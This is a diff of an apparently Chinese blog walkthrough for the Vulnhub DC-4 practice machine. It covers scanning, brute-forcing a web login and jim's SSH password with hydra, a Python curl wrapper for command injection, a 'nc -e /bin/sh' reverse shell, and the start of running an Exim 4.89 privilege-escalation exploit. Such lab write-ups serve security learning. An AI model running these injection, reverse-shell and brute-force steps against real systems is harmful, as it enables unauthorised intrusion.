@@ -2,17 +2,19 @@
 title: DC4 walk-through/learning notes
 date: 2021-01-17 +0800
 categories: [pentest-learning,Vulnhub]
-tags: ctf
+tags: ctf目标探测
 ---
 
-# discover
+# 目标探测阶段
 
-## ip
-直接使用arp-scan扫描得出结果
+## IP地址发现
+这里直接使用arp-scan扫描得出结果
+
+得到结果
 
 192.168.31.241  00:0c:29:2d:55:4f       VMware, Inc.
 
-## services
+## 服务和端口发现
 
 rustscan 
 ``` bash
@@ -32,7 +34,7 @@ Faster Nmap scanning with Rust
 80|ngnix-1.15.10
 
 
-## rest infomation
+## 其他信息
 
 ### 目录枚举
 
@@ -153,24 +155,23 @@ Disk Usage     <div class="inner">
 
 这里很明显传递了一个radio的参数可以进行远程命令执行
 
-但是无论如何都需要登陆才能返回
+但是 多次使用curl命令直接注入命令执行后发现 无论如何都需要登陆才能返回结果
 
-一开始的我是猜测是不是可能会存在一种情况
+而一开始的我是猜测是不是可能会存在一种情况
 
 即： 我的指令是真实被执行的 但是只是我看不到返回的信息就被系统清除掉了
 
 经过一系列尝试 发现并没有这种可能 
 
-也就是利用nc指令来做到 连接我的端口 输出命令执行成功的信息这样
+> 就是利用nc指令来做到 连接我的端口 输出命令执行成功的信息这样
 
 ## 成功的密码爆破
 
+就非得让我登陆呗
 
-force me to login?
+burp pro的runtime file 模式下
 
-and i run my burp pro and
-
-it works
+爆破的一些信息
 
 info|detail
 ---|---
@@ -178,7 +179,7 @@ wordlist|rockyou.txt
 username|admin
 password|happy
 
-copy the url as curl in web broswer
+然后登陆之后 f12 network 下进行抓包看
 
 我们可以看到
 
@@ -195,12 +196,14 @@ $ curl 'http://192.168.31.241/command.php' \
 -H 'Upgrade-Insecure-Requests: 1' \
 --data-raw 'radio=ls+/&submit=Run'
 ```
-## exp
-edit 这个 radio 变量就可以进行远程控制
+## 上一个利用
+直接编辑 这个 radio 变量就可以进行远程控制
 
-and i run python to simple exp it 
+这里起了一个python脚本来爆破 
 
-（直接调用shell了就不用requests库了）
+（直接调用shell了就不用requests库了 主要原因是懒得调整cookies）
+
+> 就很不优雅!
 
 ``` python
 import os
@@ -220,8 +223,8 @@ while 1:
             -H 'Upgrade-Insecure-Requests: 1' \
             --data-raw 'radio=%s&submit=Run'" %(youCommand)).read()
     print( response.split("<pre>")[1].split("</pre>")[0] )
-
-
+    #通过观察返回情况进行 用split方法把返回剥离出来
+    #如果用subprocess可能就可以更加优化一波 命令执行的过程
 ```
 
 运行效果如下：
@@ -243,9 +246,9 @@ done
  echo "But I'd rather bash my head against a brick wall."
 
 
- try to send shell.php file
+```
 
- ```
+# Shell BACK
 
 进行一波探测和弹出shell的尝试
 
@@ -270,16 +273,47 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
  ```
 
-To be continue .
+这方法直接暴毙 别想了 搞不出来这个meterpreter shell的
 
-## Shell return 
+## 返回shell
 
-use the command.php with 
+这里直接用 nc -e解决问题
 
+(nc -e 对对方机子的netcat版本有一定要求的 注意!!)
+
+```bash
 nc -e /bin/sh <ip> port 
-
-and search the files  other people 
 ```
+
+好家伙,没问题直接给我弹出来了.
+
+ 开始搜寻文件 
+
+这里有三个用户 
+
+这个叫jim的用户引起了我们的注意
+
+```
+ls -al && pwd
+total 32
+drwxr-xr-x 3 jim  jim  4096 Apr  7  2019 .
+drwxr-xr-x 5 root root 4096 Apr  7  2019 ..
+-rw-r--r-- 1 jim  jim   220 Apr  6  2019 .bash_logout
+-rw-r--r-- 1 jim  jim  3526 Apr  6  2019 .bashrc
+-rw-r--r-- 1 jim  jim   675 Apr  6  2019 .profile
+drwxr-xr-x 2 jim  jim  4096 Apr  7  2019 backups
+-rw------- 1 jim  jim   528 Apr  6  2019 mbox
+-rwsrwxrwx 1 jim  jim    39 Jan 25 14:20 test.sh
+/home/jim
+
+```
+在backups文件夹下 我们发现了old-password.bak
+
+然后很明显这里的 test.sh具有suid权限 那么也就是说 我们需要登陆这个叫做jim的用户然后使用suid
+
+
+```
+
 000000
 12345
 iloveyou
@@ -535,37 +569,22 @@ popcorn1
 
 ```
 
+很好..动手
 
-and also we get this 
+## 横向提权一波 (su the user) 
 
-```
-ls -al && pwd
-total 32
-drwxr-xr-x 3 jim  jim  4096 Apr  7  2019 .
-drwxr-xr-x 5 root root 4096 Apr  7  2019 ..
--rw-r--r-- 1 jim  jim   220 Apr  6  2019 .bash_logout
--rw-r--r-- 1 jim  jim  3526 Apr  6  2019 .bashrc
--rw-r--r-- 1 jim  jim   675 Apr  6  2019 .profile
-drwxr-xr-x 2 jim  jim  4096 Apr  7  2019 backups
--rw------- 1 jim  jim   528 Apr  6  2019 mbox
--rwsrwxrwx 1 jim  jim    39 Jan 25 14:20 test.sh
-/home/jim
+把他的文件old-password.bak弄下来 
 
-```
-we can use the suid  to get root .
+这里直接ctrl+c/v给他存到password.txt文件夹下
 
-ok now we just need login as the jim 
+然后hydra启动!..
 
-and edit the sh file to go root and got my flag 
+> hydra是一个在线多线程密码爆破攻击工具 具有高并发速度快的优点
 
-nice!!!
-
-## horizontal crossing the account(su the user) 
-
-
-so we can do hydra and crack password in backupfiles
 ``` bash 
-─$ hydra -l jim -P ./passwords.txt ssh://192.168.31.241                                   130 ⨯
+─$ hydra -l jim \ #这里是说他的用户名为jim  如果用户名是文件中的话 使用-L <file>进行爆破
+-P ./passwords.txt \ #这里是表示 我们的密码字典 
+ssh://192.168.31.241  #协议 ip和端口
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * * * ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-24 23:32:09
@@ -573,14 +592,14 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-24 23:32:
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 253 login tries (l:1/p:253), ~16 tries per task
 [DATA] attacking ssh://192.168.31.241:22/
 [STATUS] 177.00 tries/min, 177 tries in 00:01h, 77 to do in 00:01h, 16 active
-[22][ssh] host: 192.168.31.241   login: jim   password: jibril04
+[22][ssh] host: 192.168.31.241   login: jim   password: jibril04 #看 结果出来了
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-24 23:33:43
 ```
 
 
-```
-└─$ ssh jim@192.168.31.119
+```bash
+$ ssh jim@192.168.31.119      #直接ssh登陆冲上去
 The authenticity of host '192.168.31.119 (192.168.31.119)' can't be established.
 ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
@@ -613,18 +632,41 @@ jim@dc-4:~$
 
 ```
 
-edit the shell file !!
+横线移动完毕 准备提权
 
-# ROOT(pwn this machine)
+# GET your ROOT (pwn this machine)
 
-there has  a question how to edit the file with suid without the suid lose
+## 错误的suid提权方式
 
-but fail?
-i cam't root by this.
+好像编辑这个suid文件并不能让我们获得shell
 
-cat the mbox we can see the mail says
+> 经过尝试 我发现
+>
+> SUID权限设置在这个 文件上的时候 普通的编辑文件并不会使得suid权限失效
+>
+> suid的二进制文件在运行的时候会短暂的拿到最高权限 
+>
+> 一般性设置方法是c语言中 setuid(0);
+>
+> [SUID 说明 ](https://en.wikipedia.org/wiki/Setuid/)
+>
+> 这时候 使用system("/bin/bash")可以直接拿到最高权限的shell
+>
+> 而使用echo　>>续写的时候 会丢失文件权限
+>
+> copy等指令也会导致类似的结果.
 
-```
+但是简单的将文件保存为 /bin/bash的shell脚本并不能导致权限提升
+
+失败了吗?
+
+## 一番挣扎
+
+这时候开始翻了翻用户的文件
+
+这个mbox引起了我的注意
+
+```bash
 From root@dc-4 Sat Apr 06 20:20:04 2019
 Return-path: <root@dc-4>
 Envelope-to: jim@dc-4
@@ -647,17 +689,21 @@ This is a test.
 
 ```
 
-emm my be the suid shell script is the rabbit hole for the SUID ?
+emmmmmmmmmmmmmmmmm.
+
+或许这个shell with suid就是诱人的陷阱吧
 
 emmmmmmmmmmmmm....
 
-seen this mail i got my idea about how to exp it.
+这个EXIM 4.89 不眼熟吗?
 
-and i remember the exim 4 maybe got the dirty Linux LPE vuln
+我还记得上几个靶机我还做过类似的事情
 
-run find command 
+跑一下find指令证明一下我的猜想 
 
-```
+果然 exim4被设置了suid
+
+```bash
 jim@dc-4:~$ find / -type f -perm -u=s 2>/dev/zero
 /usr/bin/gpasswd
 /usr/bin/chfn
@@ -676,12 +722,12 @@ jim@dc-4:~$ find / -type f -perm -u=s 2>/dev/zero
 /home/jim/test.sh
 
 ```
-yes the exim4
+好的exim4
 
 
-cp the payload 46996 on exploit-db.com  to the machine
+直接搞下来 exploit-db.com 46996号 直接用呗
 
-```
+```bash
 jim@dc-4:~$ ./exp.sh -m netcat
 
 raptor_exim_wiz - "The Return of the WIZard" LPE exploit
